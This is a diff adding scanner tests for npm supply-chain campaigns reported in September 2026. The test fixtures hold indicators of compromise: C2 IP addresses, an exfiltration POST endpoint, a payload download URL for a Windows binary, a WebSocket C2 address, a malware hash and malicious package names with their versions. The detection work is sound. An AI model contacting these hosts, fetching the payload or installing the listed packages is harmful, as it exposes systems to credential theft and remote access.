@@ -6193,4 +6193,154 @@ describe("Campaign Signatures", () => {
     });
   });
 
+
+  // =================================================================
+  // 2026-09-14 advisory batch atomic indicators (September 2026)
+  // =================================================================
+
+  describe("n8n-nodes-sysdiag credential exfiltration (September 2026)", () => {
+    // The advisory publishes package@version; the C2 address and the POST path
+    // are the part no database carries, so these are what the two entries in
+    // ioc-blocklist.ts cover.
+    it("flags the C2 host and the exfiltration path", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "SysDiagNode.node.js"),
+        [
+          "const http = require('http');",
+          "const endpoint = 'https://121.127.33.228:443/api/v1/nodes/compat';",
+          "http.request(endpoint, { method: 'POST' });",
+        ].join("\n")
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      expect(
+        report.findings.find((f) => f.rule === "IOC_KNOWN_C2_IP"),
+        "the bare C2 address must match",
+      ).toBeDefined();
+      expect(
+        report.findings.find((f) => f.rule === "IOC_KNOWN_DEAD_DROP"),
+        "the host:port/path exfiltration endpoint must match",
+      ).toBeDefined();
+    });
+
+    // Version-pinned exactly as the advisory scopes it: 1.0.0 through 1.0.4.
+    it("blocks n8n-nodes-sysdiag at the published versions only", () => {
+      const feed = getBundledFeed();
+      expect(
+        matchBareNpmIOC("n8n-nodes-sysdiag", "1.0.2", feed),
+        "a published malicious version must match",
+      ).not.toBeNull();
+      expect(
+        matchBareNpmIOC("n8n-nodes-sysdiag", "0.9.0", feed),
+        "a version the campaign never published must not match",
+      ).toBeNull();
+    });
+  });
+
+  describe("noblox-asset.js Roblox API typosquat (September 2026)", () => {
+    // The postinstall script downloads a Windows binary from an attacker-owned
+    // Netlify subdomain. netlify[.]app itself is shared hosting and is
+    // deliberately not listed, so a different subdomain must stay clean.
+    it("flags the payload host and the download URL", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "postinstall.mjs"),
+        "const url = 'https://trlxgames.netlify.app/TRLX.exe';\ndownload(url);"
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      expect(
+        report.findings.find((f) => f.rule === "IOC_KNOWN_C2_DOMAIN"),
+        "the attacker-controlled subdomain must match",
+      ).toBeDefined();
+      expect(
+        report.findings.find((f) => f.rule === "IOC_KNOWN_DEAD_DROP"),
+        "the payload download URL must match",
+      ).toBeDefined();
+    });
+
+    it("leaves an unrelated netlify.app subdomain clean", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "deploy.js"),
+        "const site = 'https://our-own-docs.netlify.app/index.html';\nfetch(site);"
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      expect(
+        report.findings.filter(
+          (f: Finding) =>
+            f.rule === "IOC_KNOWN_C2_DOMAIN" || f.rule === "IOC_KNOWN_DEAD_DROP"
+        ),
+        "blocking the netlify.app apex would flag unrelated projects",
+      ).toHaveLength(0);
+    });
+  });
+
+  describe("pino-ulid remote-access trojan (September 2026)", () => {
+    // The C2 URL is XOR-obfuscated inside the package, so the decoded address
+    // and the agent digest are the only usable atomic indicators.
+    it("flags the WebSocket C2 host and the payload digest", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "notes.js"),
+        [
+          "// incident notes",
+          "const c2 = 'ws://95.216.232.162:8010/';",
+          "const payload = '3a9089e9db3650dd6d1584fae709022002dc34854b961abfb014a90f0a7c6a50';",
+        ].join("\n")
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      expect(
+        report.findings.find((f) => f.rule === "IOC_KNOWN_C2_IP"),
+        "the decoded WebSocket C2 address must match",
+      ).toBeDefined();
+      expect(
+        report.findings.find((f) => f.rule === "IOC_KNOWN_MALWARE_HASH"),
+        "the payload.js agent digest must match",
+      ).toBeDefined();
+    });
+
+    // pino-ulid has zero published versions on npm today (created 2026-09-12,
+    // every version unpublished by 2026-09-14), so there is no legitimate
+    // release a bare name block can hit.
+    it("blocks pino-ulid by name", () => {
+      const feed = getBundledFeed();
+      expect(
+        matchBareNpmIOC("pino-ulid", "2.12.3", feed),
+        "the published malicious version must match",
+      ).not.toBeNull();
+      expect(
+        matchBareNpmIOC("pino-ulid", "9.9.9", feed),
+        "the name carries no legitimate release, so every version matches",
+      ).not.toBeNull();
+    });
+  });
+
+  describe("biz44 npm account campaign (September 2026)", () => {
+    // Fifteen versions across nine packages, all version-pinned by the
+    // advisories. The backend the npoint[.]io loader resolves is the one atomic
+    // indicator the OSSF report publishes.
+    it("flags the campaign backend", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "loader.js"),
+        "const backend = '103.170.217.184:8787';\nconnect(backend);"
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      expect(
+        report.findings.find((f) => f.rule === "IOC_KNOWN_C2_IP"),
+      ).toBeDefined();
+    });
+
+    it("blocks the scoped packages at the published versions only", () => {
+      const feed = getBundledFeed();
+      expect(
+        matchBareNpmIOC("@biz44/runtime-utils", "1.1.100", feed),
+        "a published malicious version must match",
+      ).not.toBeNull();
+      expect(
+        matchBareNpmIOC("@biz44/runtime-utils", "1.1.12", feed),
+        "a version the campaign never published must not match",
+      ).toBeNull();
+    });
+  });
 });
